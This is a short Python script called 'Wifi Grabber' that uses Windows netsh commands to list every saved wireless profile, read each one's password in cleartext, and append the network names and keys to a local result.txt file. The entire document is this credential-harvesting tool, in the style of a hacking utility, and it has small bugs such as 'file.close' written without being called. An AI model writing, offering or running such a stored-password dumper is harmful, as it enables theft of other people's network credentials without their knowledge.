import subprocess
import time
import os

localtime = time.asctime( time.localtime(time.time()))
data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
file = open("result.txt", "a")
print("\n[+] Wifi Grabber: " + localtime + "\n")
file.write("\n[+] Wifi Grabber: " + localtime + "\n")
print("========================================================",file=file)
print(localtime, file=file)
print("========================================================",file=file)
file.close
for i in profiles:
    results = subprocess.check_output(['netsh','wlan','show','profile',i,
                                       'key=clear']).decode("utf-8").split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        print("{:<30} | {:<}".format(i, results[0]),file=file)
        file.close
    except IndexError:
        print("{:<30} | {:<}".format(i, ""))

time.sleep(3)
exit(code=True)
